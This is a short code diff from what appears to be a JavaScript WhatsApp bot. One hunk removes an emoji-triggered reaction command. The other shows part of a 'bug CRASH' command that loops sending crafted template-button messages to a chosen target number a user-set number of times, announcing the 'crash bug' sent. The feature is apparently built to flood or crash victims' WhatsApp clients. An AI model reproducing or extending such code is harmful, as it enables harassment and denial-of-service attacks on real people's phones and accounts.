@@ -600,11 +600,6 @@ haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }
 }
 break
 //=================================================//
-case '🔥':
-{
-haikal.relayMessage(from, { react }, { messageId: "ADUH OM HW AMPUN 🥺🥺🙏" })
-}
-break
 case 'poll': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
@@ -1408,7 +1403,7 @@ jumlah = text.split("|")[1]
 let secon = text.split("|")[2]
 a = await deploy(`Succes send bug "CRASH🐼" Ke ${mm} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
 for (let i = 0; i < jumlah ; i++){
-await alpha.sendMessage(mm, { 
+await haikal.sendMessage(mm, { 
 text: '', 
 templateButtons: [
 { callButton: { displayText: `OWNER`, phoneNumber: `6285714170944`}},
